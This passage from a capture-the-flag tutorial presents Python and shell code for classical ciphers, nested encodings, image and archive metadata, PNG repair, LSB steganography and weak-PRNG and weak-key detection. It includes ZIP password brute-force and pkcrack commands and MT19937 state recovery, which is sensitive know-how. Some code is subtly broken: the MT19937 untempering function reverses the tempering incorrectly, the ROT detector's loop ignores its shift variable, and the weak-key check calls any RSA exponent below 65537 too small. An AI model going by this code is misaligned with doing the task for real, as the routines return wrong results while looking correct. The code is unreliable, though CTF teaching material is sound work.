        'cipher_frequency': cipher_freq,
        'english_frequency': english_freq,
        'mapping': mapping,
        'decrypted': ''.join(decrypted)
    }

# Usage
ciphertext = "SYFXMNSLAJ FY MJ HTSYMNAJ"
result = break_substitution_cipher(ciphertext)
print(f"Decrypted: {result['decrypted']}")
```

**Multi-Stage ROT Variations**

```python
def rot_pyramid(text, start_shift=1):
    """
    Each character uses different shift: 1, 2, 3, ..., then wraps
    """
    result = []
    shift = start_shift
    
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') + shift) % 26 + ord('a')))
            shift = (shift % 26) + 1
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') + shift) % 26 + ord('A')))
            shift = (shift % 26) + 1
        else:
            result.append(char)
    
    return ''.join(result)

def rot_pyramid_decrypt(ciphertext, start_shift=1):
    """Decrypt pyramid ROT"""
    result = []
    shift = start_shift
    
    for char in ciphertext:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') - shift) % 26 + ord('a')))
            shift = (shift % 26) + 1
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') - shift) % 26 + ord('A')))
            shift = (shift % 26) + 1
        else:
            result.append(char)
    
    return ''.join(result)

# Automated detection and decryption
def detect_rot_variant(ciphertext):
    """Try to identify which ROT variant is used"""
    results = []
    
    # Try standard ROT13
    rot13_result = rot13(ciphertext)
    if 'CTF' in rot13_result or 'flag' in rot13_result.lower():
        results.append(('ROT13', rot13_result))
    
    # Try ROT47
    rot47_result = rot47(ciphertext)
    if 'CTF' in rot47_result or 'flag' in rot47_result.lower():
        results.append(('ROT47', rot47_result))
    
    # Try all Caesar shifts
    for shift in range(1, 26):
        test = caesar_bruteforce(ciphertext)
        if test[0]['score'] > 5:
            results.append((f'ROT{shift}', test[0]['plaintext']))
    
    return results if results else [('UNKNOWN', 'No ROT pattern detected')]
```

**Atbash Cipher (Reverse Alphabet)**

```python
def atbash(text):
    """
    Atbash cipher: A↔Z, B↔Y, C↔X, etc.
    Self-inverse
    """
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr(ord('z') - (ord(char) - ord('a'))))
        elif 'A' <= char <= 'Z':
            result.append(chr(ord('Z') - (ord(char) - ord('A'))))
        else:
            result.append(char)
    return ''.join(result)

# Example
plaintext = "CTF{atbash_cipher}"
encrypted = atbash(plaintext)
decrypted = atbash(encrypted)
print(f"Original: {plaintext}")
print(f"Encrypted: {encrypted}")
print(f"Decrypted: {decrypted}")
```

#### Base64 + Cipher Chains

**Nested Encoding Detection**

```python
import base64
import binascii

def detect_encoding(data):
    """Detect what encoding/cipher is applied to data"""
    encodings = []
    
    # Check if it's Base64
    try:
        decoded = base64.b64decode(data, validate=True)
        encodings.append('base64')
        return encodings, decoded
    except:
        pass
    
    # Check if it's hex
    try:
        if all(c in '0123456789abcdefABCDEF' for c in data.replace(' ', '')):
            decoded = bytes.fromhex(data.replace(' ', ''))
            encodings.append('hex')
            return encodings, decoded
    except:
        pass
    
    # Check if it's Base32
    try:
        decoded = base64.b32decode(data)
        encodings.append('base32')
        return encodings, decoded
    except:
        pass
    
    # Check if it's URL encoding
    try:
        import urllib.parse
        decoded = urllib.parse.unquote(data)
        if decoded != data:
            encodings.append('url')
            return encodings, decoded.encode()
    except:
        pass
    
    return encodings, data.encode() if isinstance(data, str) else data

def recursive_decode(data, max_depth=10):
    """
    Recursively decode nested encodings
    Common pattern: Base64(Hex(Base64(plaintext)))
    """
    depth = 0
    current_data = data
    decode_chain = []
    
    while depth < max_depth:
        encodings, decoded = detect_encoding(current_data)
        
        if not encodings:
            break
        
        decode_chain.extend(encodings)
        
        # Check if decoded data looks like a flag
        try:
            decoded_str = decoded.decode('ascii', errors='ignore')
            if 'CTF{' in decoded_str or 'flag{' in decoded_str:
                return {
                    'found': True,
                    'flag': decoded_str,
                    'chain': decode_chain,
                    'depth': depth
                }
        except:
            pass
        
        current_data = decoded
        depth += 1
    
    return {
        'found': False,
        'chain': decode_chain,
        'final_data': current_data,
        'depth': depth
    }

# Example usage
encoded = base64.b64encode(
    bytes.fromhex(
        base64.b64encode(b"CTF{nested_encoding}").decode().encode().hex()
    )
).decode()

result = recursive_decode(encoded)
print(f"Decode chain: {' -> '.join(result['chain'])}")
if result['found']:
    print(f"Flag found: {result['flag']}")
```

**Common Encoding Chains**

```python
def decode_common_chains(data):
    """
    Try common CTF encoding combinations
    """
    chains = [
        # Base64 variations
        lambda x: base64.b64decode(x),
        lambda x: base64.b64decode(x.replace('-', '+').replace('_', '/')),  # URL-safe Base64
        
        # Hex variations
        lambda x: bytes.fromhex(x),
        lambda x: bytes.fromhex(x.replace(' ', '').replace(':', '')),
        
        # Base32
        lambda x: base64.b32decode(x),
        
        # Combined chains
        lambda x: bytes.fromhex(base64.b64decode(x).decode()),
        lambda x: base64.b64decode(bytes.fromhex(x)),
        lambda x: bytes.fromhex(base64.b64decode(x).decode('ascii')),
    ]
    
    results = []
    
    for i, decode_func in enumerate(chains):
        try:
            decoded = decode_func(data)
            decoded_str = decoded.decode('ascii', errors='ignore')
            
            results.append({
                'chain_id': i,
                'success': True,
                'decoded': decoded_str,
                'has_flag': 'CTF{' in decoded_str or 'flag{' in decoded_str
            })
        except Exception as e:
            results.append({
                'chain_id': i,
                'success': False,
                'error': str(e)
            })
    
    # Return successful decodings with flags first
    return sorted([r for r in results if r['success']], 
                  key=lambda x: x['has_flag'], reverse=True)
```

**Base64 with Custom Alphabet**

```python
def custom_base64_decode(data, custom_alphabet):
    """
    Decode Base64 with custom alphabet
    Standard: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
    """
    standard_alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    # Create translation table
    trans_table = str.maketrans(custom_alphabet, standard_alphabet)
    
    # Translate and decode
    translated = data.translate(trans_table)
    return base64.b64decode(translated)

def detect_base64_alphabet(encoded_data, known_plaintext=None):
    """
    Try to detect custom Base64 alphabet
    """
    if known_plaintext:
        # Use known plaintext to derive alphabet
        standard = base64.b64encode(known_plaintext).decode()
        
        # Build character mapping
        mapping = {}
        for i, (enc_char, std_char) in enumerate(zip(encoded_data, standard)):
            if enc_char != std_char:
                mapping[enc_char] = std_char
        
        return mapping
    
    return None

# Example
custom_alpha = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/"
plaintext = b"CTF{custom_base64}"
encoded = base64.b64encode(plaintext).decode()
encoded_custom = encoded.translate(str.maketrans(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
    custom_alpha
))

print(f"Custom encoded: {encoded_custom}")
decoded = custom_base64_decode(encoded_custom, custom_alpha)
print(f"Decoded: {decoded}")
```

**Base85/Ascii85**

```python
import base64

def base85_operations(data):
    """
    Base85 encoding/decoding (more efficient than Base64)
    Often seen in CTFs as an unusual encoding
    """
    if isinstance(data, str):
        data = data.encode()
    
    # Encode
    encoded = base64.b85encode(data)
    
    # Decode
    decoded = base64.b85decode(encoded)
    
    return {
        'encoded': encoded.decode(),
        'decoded': decoded.decode()
    }

# Ascii85 (similar but different)
def ascii85_decode(data):
    """
    Ascii85 decode (used in PostScript/PDF)
    """
    # Remove <~ and ~> markers if present
    data = data.strip()
    if data.startswith('<~') and data.endswith('~>'):
        data = data[2:-2]
    
    try:
        import base64
        # Python's a85decode handles Ascii85
        return base64.a85decode(data)
    except:
        return None
```

#### Metadata Hiding (EXIF, ZIP Comments)

**EXIF Metadata Extraction**

```bash
# Command-line tools
exiftool image.jpg                    # Comprehensive metadata
exiftool -Comment image.jpg           # Specific field
exiftool -all= image.jpg              # Strip all metadata
identify -verbose image.jpg           # ImageMagick
strings image.jpg | grep -i "flag"    # Quick string search

# Extract GPS coordinates
exiftool -GPS* image.jpg

# Extract hidden comments
exiftool -Comment -UserComment -Description image.jpg
```

```python
# Python EXIF extraction
def extract_exif_data(image_path):
    """
    Extract all EXIF metadata from image
    """
    try:
        from PIL import Image
        from PIL.ExifTags import TAGS
        
        image = Image.open(image_path)
        exif_data = image._getexif()
        
        if not exif_data:
            return {'error': 'No EXIF data found'}
        
        decoded_exif = {}
        for tag_id, value in exif_data.items():
            tag = TAGS.get(tag_id, tag_id)
            decoded_exif[tag] = value
        
        # Check for flag patterns
        flag_candidates = []
        for key, value in decoded_exif.items():
            if isinstance(value, (str, bytes)):
                value_str = str(value)
                if 'CTF{' in value_str or 'flag{' in value_str:
                    flag_candidates.append({
                        'field': key,
                        'value': value_str
                    })
        
        return {
            'exif_data': decoded_exif,
            'flag_candidates': flag_candidates,
            'interesting_fields': {k: v for k, v in decoded_exif.items() 
                                   if k in ['Comment', 'UserComment', 'ImageDescription', 
                                           'Copyright', 'Artist', 'Make', 'Model']}
        }
    
    except ImportError:
        return {'error': 'PIL not installed: pip install Pillow'}
    except Exception as e:
        return {'error': str(e)}

# Quick flag search in image metadata
def quick_image_flag_search(image_path):
    """Search for flags in image using multiple methods"""
    results = []
    
    # Method 1: EXIF
    exif_result = extract_exif_data(image_path)
    if 'flag_candidates' in exif_result and exif_result['flag_candidates']:
        results.extend(exif_result['flag_candidates'])
    
    # Method 2: String search in raw bytes
    try:
        with open(image_path, 'rb') as f:
            content = f.read()
            content_str = content.decode('latin-1', errors='ignore')
            
            import re
            flags = re.findall(r'(CTF\{[^}]+\}|flag\{[^}]+\})', content_str, re.IGNORECASE)
            for flag in flags:
                results.append({'method': 'raw_bytes', 'value': flag})
    except:
        pass
    
    return results
```

**ZIP Archive Metadata**

```bash
# Extract ZIP comments
unzip -z archive.zip

# List archive contents with details
zipinfo -v archive.zip
unzip -l archive.zip

# Extract with password
unzip -P password archive.zip

# Brute force ZIP password
fcrackzip -b -c aA1 -l 1-8 -u archive.zip
john --format=zip archive.zip.hash
```

```python
import zipfile

def extract_zip_metadata(zip_path):
    """
    Extract all metadata from ZIP file
    """
    metadata = {
        'archive_comment': None,
        'file_comments': [],
        'files': [],
        'flags_found': []
    }
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            # Archive-level comment
            archive_comment = zf.comment.decode('utf-8', errors='ignore')
            metadata['archive_comment'] = archive_comment
            
            if 'CTF{' in archive_comment or 'flag{' in archive_comment:
                metadata['flags_found'].append({
                    'location': 'archive_comment',
                    'value': archive_comment
                })
            
            # File-level metadata
            for info in zf.infolist():
                file_data = {
                    'filename': info.filename,
                    'comment': info.comment.decode('utf-8', errors='ignore'),
                    'compress_type': info.compress_type,
                    'compress_size': info.compress_size,
                    'file_size': info.file_size,
                    'date_time': info.date_time,
                    'CRC': hex(info.CRC),
                    'flag_mask': info.flag_bits
                }
                
                metadata['file_comments'].append(file_data)
                
                # Check file comment for flags
                if 'CTF{' in file_data['comment'] or 'flag{' in file_data['comment']:
                    metadata['flags_found'].append({
                        'location': f"file_comment:{info.filename}",
                        'value': file_data['comment']
                    })
    
    except Exception as e:
        metadata['error'] = str(e)
    
    return metadata

def modify_zip_comment(zip_path, new_comment):
    """Add or modify ZIP archive comment"""
    with zipfile.ZipFile(zip_path, 'a') as zf:
        zf.comment = new_comment.encode('utf-8')

# ZIP known plaintext attack preparation
def prepare_known_plaintext_attack(known_file, encrypted_zip):
    """
    Prepare files for pkcrack known-plaintext attack
    """
    return {
        'tool': 'pkcrack',
        'command': f'pkcrack -C {encrypted_zip} -c file_in_zip.txt -P {known_file} -p known.txt -d decrypted.zip',
        'requirements': [
            'At least 12 bytes of known plaintext',
            'Known plaintext must be from beginning of file',
            'Both files must be in same compression state'
        ]
    }
```

**Other Archive Formats**

```python
import tarfile
import py7zr

def extract_tar_metadata(tar_path):
    """Extract metadata from TAR archives"""
    metadata = {'files': []}
    
    try:
        with tarfile.open(tar_path, 'r:*') as tar:
            for member in tar.getmembers():
                file_info = {
                    'name': member.name,
                    'size': member.size,
                    'mode': oct(member.mode),
                    'uid': member.uid,
                    'gid': member.gid,
                    'mtime': member.mtime,
                    'type': member.type,
                    'linkname': member.linkname,
                    'uname': member.uname,
                    'gname': member.gname
                }
                metadata['files'].append(file_info)
    
    except Exception as e:
        metadata['error'] = str(e)
    
    return metadata

def extract_7z_metadata(archive_path):
    """Extract metadata from 7z archives"""
    try:
        with py7zr.SevenZipFile(archive_path, 'r') as archive:
            return {
                'files': archive.getnames(),
                'test_result': archive.testzip()
            }
    except ImportError:
        return {'error': 'py7zr not installed: pip install py7zr'}
    except Exception as e:
        return {'error': str(e)}
```

#### PNG/Image Corruption

**PNG Chunk Analysis**

```python
import struct
import zlib

def parse_png_chunks(png_path):
    """
    Parse PNG file structure and extract all chunks
    PNG format: signature + chunks
    Each chunk: length (4) + type (4) + data + CRC (4)
    """
    chunks = []
    
    with open(png_path, 'rb') as f:
        # Verify PNG signature
        signature = f.read(8)
        if signature != b'\x89PNG\r\n\x1a\n':
            return {'error': 'Not a valid PNG file'}
        
        # Parse chunks
        while True:
            # Read chunk header
            length_bytes = f.read(4)
            if not length_bytes:
                break
            
            length = struct.unpack('>I', length_bytes)[0]
            chunk_type = f.read(4).decode('ascii', errors='ignore')
            chunk_data = f.read(length)
            crc = struct.unpack('>I', f.read(4))[0]
            
            # Verify CRC
            calculated_crc = zlib.crc32(chunk_type.encode() + chunk_data)
            crc_valid = (calculated_crc & 0xffffffff) == crc
            
            chunk_info = {
                'type': chunk_type,
                'length': length,
                'crc': hex(crc),
                'crc_valid': crc_valid,
                'data_preview': chunk_data[:100].hex() if length > 0 else ''
            }
            
            # Check for hidden data in specific chunks
            if chunk_type not in ['IHDR', 'PLTE', 'IDAT', 'IEND', 'tRNS', 'gAMA', 'cHRM']:
                chunk_info['unusual'] = True
                # Try to decode as text
                try:
                    text_data = chunk_data.decode('utf-8', errors='ignore')
                    if 'CTF{' in text_data or 'flag{' in text_data:
                        chunk_info['possible_flag'] = text_data
                except:
                    pass
            
            chunks.append(chunk_info)
    
    return {'chunks': chunks}

def extract_png_text_chunks(png_path):
    """
    Extract text from PNG tEXt, zTXt, and iTXt chunks
    """
    text_data = []
    
    with open(png_path, 'rb') as f:
        f.read(8)  # Skip signature
        
        while True:
            try:
                length_bytes = f.read(4)
                if not length_bytes:
                    break
                
                length = struct.unpack('>I', length_bytes)[0]
                chunk_type = f.read(4).decode('ascii')
                chunk_data = f.read(length)
                f.read(4)  # CRC
                
                if chunk_type == 'tEXt':
                    # Uncompressed text: keyword\0text
                    null_pos = chunk_data.find(b'\x00')
                    keyword = chunk_data[:null_pos].decode('latin-1')
                    text = chunk_data[null_pos+1:].decode('latin-1', errors='ignore')
                    text_data.append({'type': 'tEXt', 'keyword': keyword, 'text': text})
                
                elif chunk_type == 'zTXt':
                    # Compressed text
                    null_pos = chunk_data.find(b'\x00')
                    keyword = chunk_data[:null_pos].decode('latin-1')
                    compression = chunk_data[null_pos+1]
                    compressed_text = chunk_data[null_pos+2:]
                    text = zlib.decompress(compressed_text).decode('latin-1', errors='ignore')
                    text_data.append({'type': 'zTXt', 'keyword': keyword, 'text': text})
                
                elif chunk_type == 'iTXt':
                    # International text (UTF-8)
                    parts = chunk_data.split(b'\x00', 4)
                    if len(parts) >= 5:
                        keyword = parts[0].decode('latin-1')
                        text = parts[4].decode('utf-8', errors='ignore')
                        text_data.append({'type': 'iTXt', 'keyword': keyword, 'text': text})
            
            except:
                break
    
    return text_data
```

**PNG Steganography Detection**

```bash
# Command-line tools for PNG analysis
pngcheck -v image.png                 # Verify PNG integrity and list chunks
pngcheck -cvt image.png               # Verbose chunk information
exiftool image.png                    # Extract metadata
zsteg image.png                       # Detect steganography
zsteg -a image.png                    # All detection methods
stegsolve image.png                   # Visual analysis tool

# LSB steganography detection
stegdetect image.png

# Extract hidden data
steghide extract -sf image.png

# Binwalk for embedded files
binwalk -e image.png
binwalk --dd='.*' image.png
```

```python
def detect_lsb_steganography(image_path):
    """
    Detect Least Significant Bit steganography
    """
    try:
        from PIL import Image
        import numpy as np
        
        img = Image.open(image_path)
        pixels = np.array(img)
        
        # Extract LSBs
        lsb_data = []
        for row in pixels:
            for pixel in row:
                if isinstance(pixel, np.ndarray):
                    # RGB/RGBA
                    for channel in pixel:
                        lsb_data.append(channel & 1)
                else:
                    # Grayscale
                    lsb_data.append(pixel & 1)
        
        # Convert bits to bytes
        lsb_bytes = []
        for i in range(0, len(lsb_data), 8):
            byte_bits = lsb_data[i:i+8]
            if len(byte_bits) == 8:
                byte_val = int(''.join(map(str, byte_bits)), 2)
                lsb_bytes.append(byte_val)
        
        lsb_data_bytes = bytes(lsb_bytes)
        
        # Look for patterns
        lsb_str = lsb_data_bytes.decode('latin-1', errors='ignore')
        
        return {
            'lsb_length': len(lsb_bytes),
            'has_flag': 'CTF{' in lsb_str or 'flag{' in lsb_str,
            'preview': lsb_str[:200],
            'entropy': calculate_entropy(lsb_data_bytes)
        }
    
    except ImportError:
        return {'error': 'PIL/numpy not installed'}

def calculate_entropy(data):
    """Calculate Shannon entropy of data"""
    from collections import Counter
    import math
    
    if not data:
        return 0
    
    counter = Counter(data)
    length = len(data)
    entropy = 0
    for count in counter.values():
        probability = count / length
        entropy -= probability * math.log2(probability)
    
    return entropy

def extract_lsb_data(image_path, num_bits=1):
    """
    Extract data hidden in LSB of image
    num_bits: how many least significant bits to extract (1-8)
    """
    try:
        from PIL import Image
        import numpy as np
        
        img = Image.open(image_path)
        pixels = np.array(img)
        
        extracted_bits = []
        
        # Flatten pixel array
        if len(pixels.shape) == 3:
            # Color image
            flat_pixels = pixels.reshape(-1)
        else:
            # Grayscale
            flat_pixels = pixels.flatten()
        
        # Extract LSBs
        for pixel_value in flat_pixels:
            for bit_pos in range(num_bits):
                bit = (pixel_value >> bit_pos) & 1
                extracted_bits.append(bit)
        
        # Convert bits to bytes
        extracted_bytes = []
        for i in range(0, len(extracted_bits), 8):
            if i + 8 <= len(extracted_bits):
                byte_bits = extracted_bits[i:i+8]
                byte_val = int(''.join(map(str, byte_bits)), 2)
                extracted_bytes.append(byte_val)
        
        data = bytes(extracted_bytes)
        
        # Try to find meaningful data
        try:
            text = data.decode('utf-8', errors='ignore')
            # Look for flag patterns
            import re
            flags = re.findall(r'CTF\{[^}]+\}|flag\{[^}]+\}', text, re.IGNORECASE)
            
            return {
                'success': True,
                'data_length': len(data),
                'flags_found': flags,
                'text_preview': text[:500]
            }
        except:
            return {
                'success': True,
                'data_length': len(data),
                'binary_data': data[:100].hex()
            }
    
    except Exception as e:
        return {'error': str(e)}
```

**Image Corruption Repair**

```python
def fix_png_header(corrupted_path, output_path):
    """
    Fix corrupted PNG file signature
    Correct signature: 89 50 4E 47 0D 0A 1A 0A
    """
    with open(corrupted_path, 'rb') as f:
        data = f.read()
    
    # PNG signature
    correct_signature = b'\x89PNG\r\n\x1a\n'
    
    # Replace first 8 bytes if corrupted
    if data[:8] != correct_signature:
        fixed_data = correct_signature + data[8:]
        
        with open(output_path, 'wb') as f:
            f.write(fixed_data)
        
        return {'fixed': True, 'original_header': data[:8].hex()}
    
    return {'fixed': False, 'message': 'Header already correct'}

def fix_png_dimensions(png_path, output_path, width=None, height=None):
    """
    Fix corrupted IHDR chunk (width/height)
    IHDR structure: width(4) height(4) bit_depth(1) color_type(1) 
                    compression(1) filter(1) interlace(1)
    """
    with open(png_path, 'rb') as f:
        data = bytearray(f.read())
    
    # Find IHDR chunk (after 8-byte signature)
    ihdr_pos = 8 + 4  # Skip signature and length
    
    if data[ihdr_pos:ihdr_pos+4] != b'IHDR':
        return {'error': 'IHDR chunk not found'}
    
    # IHDR data starts at ihdr_pos + 4
    ihdr_data_pos = ihdr_pos + 4
    
    if width:
        # Replace width (bytes 0-3 of IHDR data)
        data[ihdr_data_pos:ihdr_data_pos+4] = struct.pack('>I', width)
    
    if height:
        # Replace height (bytes 4-7 of IHDR data)
        data[ihdr_data_pos+4:ihdr_data_pos+8] = struct.pack('>I', height)
    
    # Recalculate CRC for IHDR chunk
    ihdr_length = struct.unpack('>I', data[8:12])[0]
    ihdr_chunk = data[ihdr_pos:ihdr_pos+4+ihdr_length]
    new_crc = zlib.crc32(ihdr_chunk) & 0xffffffff
    crc_pos = ihdr_pos + 4 + ihdr_length
    data[crc_pos:crc_pos+4] = struct.pack('>I', new_crc)
    
    with open(output_path, 'wb') as f:
        f.write(data)
    
    return {'fixed': True, 'width': width, 'height': height}

def reconstruct_png_crc(png_path, output_path):
    """
    Recalculate all CRC values in PNG
    """
    with open(png_path, 'rb') as f:
        data = bytearray(f.read())
    
    if data[:8] != b'\x89PNG\r\n\x1a\n':
        return {'error': 'Not a valid PNG'}
    
    pos = 8
    chunks_fixed = 0
    
    while pos < len(data):
        # Read chunk
        length = struct.unpack('>I', data[pos:pos+4])[0]
        chunk_type = data[pos+4:pos+8]
        chunk_data = data[pos+8:pos+8+length]
        
        # Calculate correct CRC
        correct_crc = zlib.crc32(chunk_type + chunk_data) & 0xffffffff
        
        # Replace CRC
        crc_pos = pos + 8 + length
        data[crc_pos:crc_pos+4] = struct.pack('>I', correct_crc)
        chunks_fixed += 1
        
        # Move to next chunk
        pos += 12 + length
        
        # Stop at IEND
        if chunk_type == b'IEND':
            break
    
    with open(output_path, 'wb') as f:
        f.write(data)
    
    return {'chunks_fixed': chunks_fixed}
```

**JPEG Analysis**

```python
def extract_jpeg_comments(jpeg_path):
    """
    Extract comments from JPEG file
    JPEG uses markers: FF D8 (SOI), FF E0-EF (APP), FF FE (COM)
    """
    comments = []
    
    with open(jpeg_path, 'rb') as f:
        data = f.read()
    
    # Check JPEG signature
    if data[:2] != b'\xff\xd8':
        return {'error': 'Not a JPEG file'}
    
    pos = 2
    while pos < len(data) - 1:
        # Look for marker
        if data[pos] != 0xFF:
            pos += 1
            continue
        
        marker = data[pos+1]
        pos += 2
        
        # COM marker (0xFE)
        if marker == 0xFE:
            # Read length
            if pos + 2 <= len(data):
                length = struct.unpack('>H', data[pos:pos+2])[0]
                comment_data = data[pos+2:pos+length]
                try:
                    comment = comment_data.decode('utf-8', errors='ignore')
                    comments.append({
                        'type': 'COM',
                        'content': comment,
                        'offset': pos - 2
                    })
                except:
                    pass
                pos += length
        
        # APP markers (0xE0-0xEF) may contain data
        elif 0xE0 <= marker <= 0xEF:
            if pos + 2 <= len(data):
                length = struct.unpack('>H', data[pos:pos+2])[0]
                app_data = data[pos+2:pos+length]
                
                # Check for text data
                try:
                    text = app_data.decode('utf-8', errors='ignore')
                    if 'CTF{' in text or 'flag{' in text:
                        comments.append({
                            'type': f'APP{marker-0xE0}',
                            'content': text,
                            'offset': pos - 2
                        })
                except:
                    pass
                
                pos += length
        else:
            pos += 1
    
    return {'comments': comments}

def jpeg_end_of_file_data(jpeg_path):
    """
    Check for data appended after JPEG EOI marker (FF D9)
    """
    with open(jpeg_path, 'rb') as f:
        data = f.read()
    
    # Find EOI marker
    eoi_pos = data.rfind(b'\xff\xd9')
    
    if eoi_pos == -1:
        return {'error': 'No EOI marker found'}
    
    # Check if there's data after EOI
    trailing_data = data[eoi_pos+2:]
    
    if len(trailing_data) > 0:
        try:
            text = trailing_data.decode('utf-8', errors='ignore')
            return {
                'has_trailing_data': True,
                'length': len(trailing_data),
                'text': text,
                'hex': trailing_data[:100].hex()
            }
        except:
            return {
                'has_trailing_data': True,
                'length': len(trailing_data),
                'binary': trailing_data[:100].hex()
            }
    
    return {'has_trailing_data': False}
```

#### Modified Algorithm Parameters

**Weak Random Number Generator Detection**

```python
import random
import time

def detect_weak_prng(outputs):
    """
    Detect if outputs come from Python's random (Mersenne Twister)
    or other weak PRNGs
    """
    # Test for linear patterns
    differences = [outputs[i+1] - outputs[i] for i in range(len(outputs)-1)]
    
    # Check for LCG patterns
    if len(outputs) >= 3:
        # Try to detect LCG: x_n+1 = (a*x_n + c) mod m
        possible_lcg = detect_lcg_parameters(outputs)
        if possible_lcg:
            return {
                'prng_type': 'LCG',
                'parameters': possible_lcg,
                'predictable': True
            }
    
    # Check for MT19937 patterns
    if len(outputs) >= 624:
        return {
            'prng_type': 'Possible MT19937',
            'note': 'Can recover state from 624 outputs',
            'predictable': True
        }
    
    return {'prng_type': 'Unknown', 'predictable': False}

def detect_lcg_parameters(outputs):
    """
    Attempt to detect LCG parameters from output sequence
    """
    if len(outputs) < 3:
        return None
    
    # Assume modulus is power of 2 (common)
    for m_bits in [32, 31, 16]:
        m = 2 ** m_bits
        
        # Try to solve for a and c
        # x1 = (a*x0 + c) mod m
        # x2 = (a*x1 + c) mod m
        # x2 - x1 = a*(x1 - x0) mod m
        
        try:
            x0, x1, x2 = outputs[0], outputs[1], outputs[2]
            
            if (x1 - x0) % m == 0:
                continue
            
            # Calculate a
            a = ((x2 - x1) * pow(x1 - x0, -1, m)) % m
            
            # Calculate c
            c = (x1 - a * x0) % m
            
            # Verify with next values
            correct = True
            for i in range(len(outputs) - 1):
                predicted = (a * outputs[i] + c) % m
                if predicted != outputs[i+1]:
                    correct = False
                    break
            
            if correct:
                return {'a': a, 'c': c, 'm': m}
        except:
            continue
    
    return None

def predict_mt19937_state(outputs):
    """
    Recover MT19937 state from 624 outputs
    """
    if len(outputs) < 624:
        return None
    
    state = []
    for output in outputs[:624]:
        # Untemper the output
        value = mt19937_untemper(output)
        state.append(value)
    
    # Create RNG with recovered state
    # [Inference] This demonstrates concept; full implementation needs MT19937 internals
    return {
        'state_recovered': True,
        'state': state,
        'note': 'Can now predict future outputs'
    }

def mt19937_untemper(y):
    """Reverse MT19937 tempering (from previous section)"""
    y = y ^ (y >> 18)
    y = y ^ ((y << 15) & 0xefc60000)
    for _ in range(4):
        y = y ^ ((y << 7) & 0x9d2c5680)
    y = y ^ (y >> 11)
    y = y ^ (y >> 11)
    return y & 0xffffffff
```

**Weak Key Detection**

```python
def detect_weak_crypto_params(params):
    """
    Detect common weak cryptographic parameters in CTFs
    """
    issues = []
    
    # Check RSA parameters
    if 'n' in params and 'e' in params:
        n, e = params['n'], params['e']
        
        # Small exponent
        if e < 65537:
            issues.append({
                'param': 'RSA e',
                'issue': f'e={e} is too small',
                'attack': 'Small exponent attack'
            })
        
        # Small modulus
        n_bits = n.bit_length()
        if n_bits < 512:
            issues.append({
                'param': 'RSA n',
                'issue': f'n is only {n_bits} bits',
                'attack': 'Factorization (GNFS, CADO-NFS)'
            })
        elif n_bits < 1024:
            issues.append({
                'param': 'RSA n',
                'issue': f'n is {n_bits} bits (weak by modern standards)',
                'attack': 'Possible with significant resources'
            })
        
        # Check if n is even
        if n % 2 == 0:
            issues.append({
                'param': 'RSA n',
                'issue': 'n is even',
                'attack': 'Trivially factor as 2 * (n/2)'
            })
        
        # Check for small factors
        small_primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]
        for p in small_primes:
            if n % p == 0:
                issues.append({
                    'param': 'RSA n',
                    'issue': f'n divisible by {p}',
                    'attack': f'Factor: {p} * {n//p}'
                })
    
    # Check AES parameters
    if 'aes_key' in params:
        key = params['aes_key']
        key_bits = len(key) * 8
        
        if key_bits < 128:
            issues.append({
                'param': 'AES key',
                'issue': f'Key is only {key_bits} bits',
                'attack': 'Brute force feasible'
            })
        
        # Check for weak keys (all zeros, all ones, repeating pattern)
        if key == b'\x00' * len(key):
            issues.append({
                'param': 'AES key',
                'issue': 'Key is all zeros',
                'attack': 'Known weak key'
            })
        elif key == b'\xff' * len(key):
            issues.append({
                'param': 'AES key',
                'issue': 'Key is all ones',
                'attack': 'Known weak key'
            })
        elif len(set(key)) <= 2:
            issues.append({
                'param': 'AES key',
                'issue': 'Key has very low entropy',
                'attack': 'Pattern-based attack'
            })
    
    # Check IV/nonce
    if 'iv' in params:
        iv = params['iv']
        if iv == b'\x00' * len(iv):
            issues.append({
                'param': 'IV',
                'issue': 'IV is all zeros',
                'attack': 'Predictable IV attack'
            })
    
    return issues

def analyze_cipher_implementation(ciphertext, known_plaintext=None):
    """
    Analyze ciphertext for implementation weaknesses
    """
    analysis = {
        'length': len(ciphertext),
        'entropy': calculate_entropy(ciphertext),
        'patterns': []
    }
    
    # Check for repeating blocks (ECB mode indicator)
    block_sizes = [8, 16, 32]
    for block_size in block_sizes:
        if len(ciphertext) >= block_size * 2:
            blocks = [ciphertext[i:i+block_size] 
                     for i in range(0, len(ciphertext), block_size)]
            unique_blocks = len(set(blocks))
            total_blocks = len(blocks)
            
            if unique_blocks < total_blocks:
                analysis['patterns'].append({
                    'type': 'Repeating blocks',
                    'block_size': block_size,
                    'unique': unique_blocks,
                    'total': total_blocks,
                    'likely_mode': 'ECB',
                    'weakness': 'Block reordering possible'
                })
    
    # Check for low entropy (possible weak encryption)
    if analysis['entropy'] < 4.0:
        analysis['patterns'].append({
            'type': 'Low entropy',
            'value': analysis['entropy'],
            'weakness': 'Possible XOR or substitution cipher'
        })
    
    # Check for null bytes
    null_count = ciphertext.count(b'\x00')
    if null_count > len(ciphertext) * 0.1:
        analysis['patterns'].append({
            'type': 'High null byte count',
            'count': null_count,
            'percentage': (null_count / len(ciphertext)) * 100,
            'weakness': 'Possible incomplete encryption or padding'
        })
    
    return analysis
```

**Custom Caesar with Offset**

```python
def custom_caesar_variants():
    """
    Common CTF variations of Caesar cipher
    """
    
    def caesar_with_key(text, key):
        """Caesar cipher where shift = sum of key characters"""
        shift = sum(ord(c) for c in key) % 26
        return caesar_shift(text, shift)
    
    def caesar_shift(text, shift):
        """Helper for Caesar shift"""
        result = []
        for char in text:
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + shift) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + shift) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)
